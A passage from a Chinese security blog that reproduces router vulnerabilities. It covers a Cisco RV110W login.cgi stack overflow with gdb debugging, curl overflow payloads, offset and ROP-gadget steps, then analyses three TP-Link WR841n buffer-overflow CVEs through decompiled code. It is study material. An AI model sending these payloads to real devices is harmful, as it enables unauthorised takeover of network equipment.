class="hljs-literal">true</span>;<br>  &#125;<br>LAB_00431d18:<br>  __s1_00 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">nvram_get</span>(<span class="hljs-string">&quot;auth_st&quot;</span>);<br>  <span class="hljs-keyword">if</span> ((((__s1_00 == (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>) || (iVar2 = <span class="hljs-built_in">strcmp</span>(__s1_00,<span class="hljs-string">&quot;1&quot;</span>), iVar2 != <span class="hljs-number">0</span>)) ||<br>      (__s1_00 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">nvram_get</span>(<span class="hljs-string">&quot;http_power&quot;</span>), __s1_00 == (<span class="hljs-type">char</span> *)<span class="hljs-number">0x0</span>)) ||<br>     ((iVar2 = <span class="hljs-built_in">strcmp</span>(__s1_00,<span class="hljs-string">&quot;rw&quot;</span>), iVar2 != <span class="hljs-number">0</span> || (bVar1)))) &#123;<br>    <span class="hljs-built_in">nvram_set</span>(<span class="hljs-string">&quot;http_power&quot;</span>,&amp;local_108);<br>    iVar2 = <span class="hljs-built_in">nvram_get</span>(<span class="hljs-number">0x485054</span>);<br>    <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) &#123;<br>      iVar2 = <span class="hljs-number">0x487990</span>;<br>    &#125;<br>    <span class="hljs-built_in">set_key_status</span>(iVar2,&amp;DAT_0047f7d4);<br>    uVar7 = <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    iVar2 = <span class="hljs-built_in">strcmp</span>((<span class="hljs-type">char</span> *)&amp;local_108,<span class="hljs-string">&quot;rw&quot;</span>);<br>    <span class="hljs-keyword">if</span> (iVar2 == <span class="hljs-number">0</span>) &#123;<br>      uVar7 = <span class="hljs-built_in">nvram_get</span>(<span class="hljs-number">0x485054</span>);<br>      <span class="hljs-built_in">nvram_set</span>(<span class="hljs-string">&quot;tmp_auth_key&quot;</span>,uVar7);<br>      uVar7 = <span class="hljs-number">3</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      uVar7 = <span class="hljs-number">2</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> uVar7;<br>&#125;<br></code></pre></td></tr></table></figure><p>接着valid_user()函数是如何调用并触发的，根据交叉引用，valid_user 函数在login_check 函数中调用，并且valid_user 的参数也是login_check 函数需要的参数。</p><p>int login_check(undefined4 uParm1,undefined4 uParm2,undefined4 uParm3)  : </p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210727105812234.png" alt="image-20210727105812234"></p><p>继续查看login_check 的交叉引用，查看这些参数的传入位置，在log_in_cgi()函数中，此函数会使用get_cgi()分别获取在登录的时候输入的“user”、”pwd”的值。并且把获取到的值作为参数传给login_check()，login_check 函数可以看到调用的时候，传入了三个参数，并且查看到参数分别是user、pwd 的值。ghidra 没有像IDA一样自动显示字符串，我们可以双击 “&amp;DAT_00481470” 查看，也可以设置data为strings。</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115161243487.png" alt="image-20221115161243487"></p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115161529938.png" alt="image-20221115161529938"></p><p>具体的程序漏洞触发流程如下图所示</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211122202746989.png" alt="image-20211122202746989"></p><h2 id="0x03-漏洞远程调试-漏洞利用"><a href="#0x03-漏洞远程调试-漏洞利用" class="headerlink" title="0x03 漏洞远程调试&amp;漏洞利用"></a>0x03 漏洞远程调试&amp;漏洞利用</h2><p>通过固件分析，了解了漏洞的产生点，现在开始对漏洞点进行远程调试，上传gdbserver(mips)，并开启设备中的远程调试</p><p>设备端：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># wget http://192.168.1.100:80/gdbserver</span><br><span class="hljs-attribute">Connecting</span> to <span class="hljs-number">192.168.1.101:80</span> (<span class="hljs-number">192.168.1.101:80</span>)<br><span class="hljs-attribute">gdbserver</span>            <span class="hljs-number">100</span>% |*******************************|  <span class="hljs-number">1011</span>k --:--:-- ETA<br><span class="hljs-comment"># chmod 777 ./gdbserver</span><br><span class="hljs-comment"># ps -w | grep httpd</span><br>  <span class="hljs-attribute">348</span> <span class="hljs-number">0</span>          <span class="hljs-number">6284</span> S   httpd <br>  <span class="hljs-attribute">356</span> <span class="hljs-number">0</span>          <span class="hljs-number">6416</span> S   httpd -S <br><span class="hljs-comment"># ./gdbserver --attach :1234 356</span><br><span class="hljs-attribute">Attached</span>; pid = <span class="hljs-number">356</span><br><span class="hljs-attribute">Listening</span> <span class="hljs-literal">on</span> port <span class="hljs-number">1234</span><br><br><span class="hljs-comment"># wget http://10.10.10.100:80/gdbserver</span><br><span class="hljs-attribute">Connecting</span> to <span class="hljs-number">10.10.10.100:80</span> (<span class="hljs-number">10.10.10.100:80</span>)<br><span class="hljs-attribute">gdbserver</span>            <span class="hljs-number">100</span>% |*******************************|  <span class="hljs-number">1011</span>k <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> ETA<br><span class="hljs-comment"># chmod 777 ./gdbserver </span><br><span class="hljs-comment"># ./gdbserver --attach :1234 348</span><br><span class="hljs-attribute">Attached</span>; pid = <span class="hljs-number">348</span><br><span class="hljs-attribute">Listening</span> <span class="hljs-literal">on</span> port <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p>调试端：使用gdb 进行远程调试，设置架构集和大小端。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams">gdb-multiarch -q httpd<br>pwndbg&gt; <span class="hljs-keyword">set</span> architecture <span class="hljs-comment">mips</span><br>The <span class="hljs-comment">target architecture is assumed to be mips</span><br>pwndbg&gt; <span class="hljs-keyword">set</span> <span class="hljs-comment">endian little</span> <br>The <span class="hljs-comment">target is assumed to be little endian</span><br>pwndbg&gt; target <span class="hljs-comment">remote 192.168.1.1:1234</span><br>Remote <span class="hljs-comment">debugging using 192.168.1.1:1234</span><br>Reading /usr/<span class="hljs-comment">lib</span>/libnvram.so from remote target...<br></code></pre></td></tr></table></figure><h3 id="1）劫持PC"><a href="#1）劫持PC" class="headerlink" title="1）劫持PC"></a>1）劫持PC</h3><p>接下来我们要计算valid_user(）函数中局部变量acStack109到$ra的偏移量</p><p>使用pattern.py 来生成随机字符</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20221115161853464.png" alt="image-20221115161853464"></p><p>在调试中 在valid_user 函数分配栈空间的指令地址处打断点  break *0x004318BC，然后启动调试</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">pwndbg&gt; <span class="hljs-keyword">break</span> *<span class="hljs-number">0x004318BC</span><br>pwndbg&gt; <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>发送payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> -i -k -X POST https://<span class="hljs-number">10.10.10.1</span>/login.cgi -d &#x27;submit_button=login&amp;submit_type=&amp;gui_action=&amp;default_login=<span class="hljs-number">1</span>&amp;wait_time=<span class="hljs-number">0</span>&amp;change_action=&amp;enc=<span class="hljs-number">1</span>&amp;user=cisco&amp;pwd=Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&amp;sel_lang=EN&#x27;<br></code></pre></td></tr></table></figure><p>程序会断点在valid_user函数的序言处。</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119143402853.png" alt="image-20211119143402853"></p><p>根据valid_user(a1,a2,a3,a4)的定义，并且在login_check函数中调用valid_user函数的汇编可知，上面的调试的断点处，寄存器中的$A0存放user的值，$A1存放pwd的值，$A2存放enc&#x3D;的值。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119144149619.png" alt="image-20211119144149619"></p><p>调试到strcpy处，strcpy将pwd的内存地址拷贝到函数的栈空间内。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119151450701.png" alt="image-20211119151450701"></p><p>接着往下执行，程序会在strlen 提前中断，调试无法进行下去。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119152320374.png" alt="image-20211119152320374"></p><h5 id="中断分析"><a href="#中断分析" class="headerlink" title="中断分析"></a>中断分析</h5><p>函数提前崩溃的原因是strlen()函数的参数$a0的值必须是一个有效的地址，根据汇编代码可知，在覆盖栈上的返回地址之后，会覆盖0x200+arg_0指向的栈空间内容，然后$a0会获取 0x200+arg_0 栈空间地址的内容，然后将其作为参数传递给strlen，因此0x200+arg_0 必须是一个有效的地址，但是我们刚刚传入的值是一个无效的地址，因此为了保证valid_user函数执行时，能够正常执行下去而不被破坏，就需要给strlen传入一个有效的地址。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119161913352.png" alt="image-20211119161913352"></p><p>因此为了不破坏strlen函数的栈空间，需要手动计算偏移地址。</p><p>根据函数的序言，可以计算出v38 到 var_s24的偏移是105个字节<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210729113044396.png" alt="image-20210729113044396"></p><p>构造105*‘A’+DDDD+ZZZZ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> -i -k -X POST https://<span class="hljs-number">10.10.10.1</span>/login.cgi -d &#x27;submit_button=login&amp;submit_type=&amp;gui_action=&amp;default_login=<span class="hljs-number">1</span>&amp;wait_time=<span class="hljs-number">0</span>&amp;change_action=&amp;enc=<span class="hljs-number">1</span>&amp;user=cisco&amp;pwd=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDDZZZZ&amp;sel_lang=EN&#x27;<br></code></pre></td></tr></table></figure><p>程序依旧会在strlen()函数处中断，并且传入的参数是”ZZZZ”。</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119172907415.png" alt="image-20211119172907415"></p><p>如果是构造 构造105*‘A’+DDDD 的话，执行到strlen处，获取到正确有效的地址。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119173608437.png" alt="image-20211119173608437"></p><p>最终可以劫持PC<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119173834064.png" alt="image-20211119173834064"></p><h3 id="2）-计算偏移量"><a href="#2）-计算偏移量" class="headerlink" title="2） 计算偏移量"></a>2） 计算偏移量</h3><p>经过上面的劫持PC, valid_user()函数中局部变量acStack109 到$ra的偏移量是105，因此只需要填充105个字节就可以到达$ra返回地址</p><h3 id="3）确定漏洞利用途径"><a href="#3）确定漏洞利用途径" class="headerlink" title="3）确定漏洞利用途径"></a>3）确定漏洞利用途径</h3><p>由于mips 架构的程序无法开启NX防护，因此接下来只需要寻找可用的gadgets.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">shayuhuajiao@ubuntu</span> <span class="hljs-string">~/i/g/_/s/u/sbin&gt;</span> <span class="hljs-string">checksec</span> <span class="hljs-string">httpd</span> <br>[<span class="hljs-string">*</span>] <span class="hljs-string">Checking</span> <span class="hljs-string">for</span> <span class="hljs-string">new</span> <span class="hljs-string">versions</span> <span class="hljs-string">of</span> <span class="hljs-string">pwntools</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/shayuhuajiao/_RV110W_FW_1.2.1.7.bin.extracted/squashfs-root/usr/sbin/httpd&#x27;</span><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">mips-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span><br></code></pre></td></tr></table></figure><p>首先使用vmmap 查看程序运行时加载的lib 库的情况和执行权限。这里我们可以确定&#x2F;lib&#x2F;libc.so.0是可以使用的。</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210730101633714.png" alt="image-20210730101633714"></p><p>使用 mipscrop.stackfinder() 找到合适的 gadget。</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210809144156630.png" alt="image-20210809144156630"></p><p>寻找可以利用的system 函数和该函数的对Libc 中的偏移地址，然后根据libc 的基地址，就可以获取system的完整地址为 0x2af98000 + 0x0004C7E0 &#x3D; 0x2AFE47E0</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210730102407081.png" alt="image-20210730102407081"></p><p>找到可以使用的nop 地址<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211124155554186.png" alt="image-20211124155554186"></p><h3 id="4）-构造最终的ROP-Chain"><a href="#4）-构造最终的ROP-Chain" class="headerlink" title="4） 构造最终的ROP Chain"></a>4） 构造最终的ROP Chain</h3><p>最终构造的ROP chain 如下图所示</p><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211124162224979.png" alt="image-20211124162224979"></p><h3 id="5-exploit-测试"><a href="#5-exploit-测试" class="headerlink" title="5)  exploit 测试"></a>5)  exploit 测试</h3><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119181424341.png" alt="image-20211119181424341"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TP-Link WR841n 路由器多个缓冲区溢出漏洞复现</title>
    <link href="/2023/12/15/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/12/15/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="TP-Link-WR841n-路由器多个缓冲区溢出漏洞复现"><a href="#TP-Link-WR841n-路由器多个缓冲区溢出漏洞复现" class="headerlink" title="TP-Link WR841n 路由器多个缓冲区溢出漏洞复现"></a>TP-Link WR841n 路由器多个缓冲区溢出漏洞复现</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近看到了关于TP-Link 一个古老的路由器 WR841n 的漏洞披露文章，都是关于缓冲区溢出的漏洞，虽然设备老，但是漏洞的发现过程都挺有学习价值的。在平时对设备的漏洞挖掘过程中，可能会比较倾向于对设备的工作流程进行分析，然后逆向一些关键的函数和代码，在这些代码和函数中，找到可能存在的漏洞函数，拿缓冲区溢出漏洞来说，会分析strcpy、sprintf 、strcat、gets 诸如此类的函数，查看局部变量在拷贝字符串的时候是否对字符串的长度进行限制。但是比较少的对通过指针或者地址的拷贝字符串的方式进行分析，通过指针拷贝字符串也经常的会出现缓冲区溢出漏洞。接下来我将WR841n 设备中存在的三个缓冲区溢出的漏洞进行分析，记录，整理。所以这是一篇学习记录的文章。漏洞的披露链接在参考章节。</p><h2 id="0x02-http流程分析"><a href="#0x02-http流程分析" class="headerlink" title="0x02 http流程分析"></a>0x02 http流程分析</h2><p>固件版本:  <a href="https://www.tp-link.com/vn/support/download/tl-wr841n/v10/#Firmware">3.16.9 Build 150310</a></p><p>首先通过main 函数调用httpd() 和 httpBasicRpmInit() 函数对设备的http服务进行初始化，这个函数会将设备的一些功能进行初始化，并且路由器的相关http 功能处理的函数在这个函数中进行配置，初始化。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220904161544218.png" alt="image-20220904161544218"></p><p>在httpd() 函数初始化的时候，会创建httpServerCreate()函数，来用以创建http Server，</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220904162043597.png" alt="image-20220904162043597"></p><p>在经过 httpServerCreate() –&gt;sub_4F5CD0 –&gt; httpDispatcher() 之后。会经过httpDispatcher()函数，这个函数会处理为各个不同的url 调用httpGenListFuncGet()函数进行函数注册绑定，以保证传入的request 请求数据包中的url 有对应的注册函数进行处理传入的对应数据包。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220904162237720.png" alt="image-20220904162237720"></p><p>最终httpRpmConfAdd  函数会获取 request_url 对应的函数指针，然后调用函数。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220904163152435.png" alt="image-20220904163152435"></p><p>具体的使用方式如httpPingIframeInit()函数。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220904162924650.png" alt="image-20220904162924650"></p><h2 id="0x03-第一个漏洞分析CVE-2020-8423"><a href="#0x03-第一个漏洞分析CVE-2020-8423" class="headerlink" title="0x03 第一个漏洞分析CVE-2020-8423"></a>0x03 第一个漏洞分析CVE-2020-8423</h2><p>接下来分析WR841n 中的三个漏洞</p><p>首先来看一下CVE-2020-8423，vulnerability function stringModify()，这个函数是于转义一些字符的。当我们输入字符中有 “&#x2F;“ ，”&gt;”，”\\“，”&lt;” ，’ &quot; ‘ 时，会在当前字符前面添加一个”\“ ，这一块的处理代码在line23~ line 44 。如果当前的字符是 “&#x2F;“ , 那么字line 30 会*a1 指针指向的值是 “\“，然后在line 33 ，a1 的指针就会加1 指向下一个内存地址。接着到达line 42，这一行会给a1 现在的地址指向的值复制为 当前的字符 “&#x2F;“，因为现在的a1 指针的地址是之前已经加1 了，所以内存中的字符应该是 “/“。</p><p>接下来在line 53 还会获取当前字符下一个字符，然后判断这个字符是否是 “\n” 并且还要是 “\r” ，否则就会在内存中添加 “&lt;br&gt;”，然后指针往后移4个地址。感觉这一段很有问题，因为一个字符没办法同时等于两种不同的字符，所以最终肯定会走到这里。QAQ</p><p>因此只需要传入的字符是”&#x2F;\n” 那么就会变成 “/&lt;br&gt;”，比原先多了四个字节。然后a1的大小设置是512个字节，因此当经过这个函数之后，如果我们传入512个这种字符串，就会比原先多2048个字节，从而造成buffer overflow 。</p><p>stringModify()</p><p>该函数在遇到字符\、&#x2F;、&lt;、&gt;”时添加字符\，或者如果下一个字符不是\n和\r，则添加&lt;br&gt;，当缓冲区满时进程将停止。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902223305823.png" alt="image-20220902223305823"></p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902231606005.png" alt="image-20220902231606005"></p><p>现在我们要考虑是的stringModify() 那里会被调用并可以传入字符串，查看交叉引用可以看到writepageParamSet()函数在调用。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902232740116.png" alt="image-20220902232740116"></p><p>然后继续查看writepageParamSet() 函数的交叉引用，可以看到在sub_45FA94() line 308 中传入v53 变量中的字符串。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220830155645198.png" alt="image-20220830155645198"></p><p>在这个函数的line 240 会获取ssid 的值。然后将值复制给v53。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902233425566.png" alt="image-20220902233425566"></p><h2 id="0x04-第二个漏洞分析-CVE-2022-30024"><a href="#0x04-第二个漏洞分析-CVE-2022-30024" class="headerlink" title="0x04 第二个漏洞分析  CVE-2022-30024"></a>0x04 第二个漏洞分析  CVE-2022-30024</h2><p>这个产生的原因 isAddrDispose()在处理ping_addr 的时候对ping value 长度的限制设置并没有起到效果，这种问题在缓冲区溢出中是很常见的，我们可以看到在 line28 行会对 ping value 的调用strlen 进行计算长度。这个长度的大小在于我们输入value 的大小而确定的，比如我输入一千多个字符，那么这个len_ping_addr 长度就是一千。</p><p>这就造成了在line 35 中并没有起到对输入字符长度起到任何的作用。在line 32~line 40 中是将ping value 的字符逐个传递给v23局部变量，而v23 定义的数据大小仅仅为52个字节 。因此会造成又一个buffer overflow </p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220830171410260.png" alt="image-20220830171410260"></p><p>这个函数会在sub_44A530() 中进行处理。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902220743030.png" alt="image-20220902220743030"></p><p>当请求的url中是“ &#x2F;userRpm&#x2F;PingIframeRpm.htm ” 时，httpGetEnv() 会获取ping_addr 的value 。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902220913276.png" alt="image-20220902220913276"></p><p>然后回调用 isAddrDispose() 函数来处理 ping_addr 的value，也就是我们前面分析过程了。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902221016715.png" alt="image-20220902221016715"></p><h2 id="0x05-第三个漏洞分析-CVE-2022-24355"><a href="#0x05-第三个漏洞分析-CVE-2022-24355" class="headerlink" title="0x05 第三个漏洞分析 CVE-2022-24355"></a>0x05 第三个漏洞分析 CVE-2022-24355</h2><p>前面我们知道了httpRpmConfAdd 函数会根据请求数据包的url 中的路径来确定调用相应的注册函数，在httpd初始化的时候，会把httpRpmFS() 函数和 url 的字符串”&#x2F;loginFs&#x2F;“,”&#x2F;fs&#x2F;“ 进行绑定并注册函数。接下来分析httpRmpFs函数是如何处理请求URL 中带有”&#x2F;loginFs&#x2F;“ 的数据包。 </p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220901231622196.png" alt="image-20220901231622196"></p><p>首先会函数的形参a1 是获取到的请求数据包，然后回获取到数据包的header 信息以及数据包的中的url，然后和&#x2F;tmp&#x2F;或者&#x2F;web&#x2F;文件路径进行拼接，判断是否是这两个文件夹中的文件，在判断的过程中，还做了过滤“..” ，以免请求的文件url 存在路径穿越的漏洞。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902214447028.png" alt="image-20220902214447028"></p><p>接下来程序会走到sub_4EE210函数中。</p><p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220901231346583.png" alt="image-20220901231346583"></p><p>我们来到函数sub_4EE2210() 中，这个本来是为了提取文件后缀的。但是由于首先会判断v2 的值是为空。我们知道v2 的值是 &#x2F;tmp&#x2F;loginfs&#x2F;passwd ，接下来在line 21 获取文件路径的指针，然后一直往指针在往低地址移动，匹配是否有 “.” 。找到了之后就会把 “.” 字符的下一个字符地址赋给v4。其实由于file_path 中是passwd ，因此没有 “ . “ 字符，因此会继续移动指针，会导致指针移动到 header 中 referer 中的 url中的 “.”。因此会获取referer 中“.” 的下一个指针地址给v4。并且在line28 的循环中将后面的每个字符进行转成大写字母，然后写入到file_extension 从而造成了 buffer overflow。</p><p><img 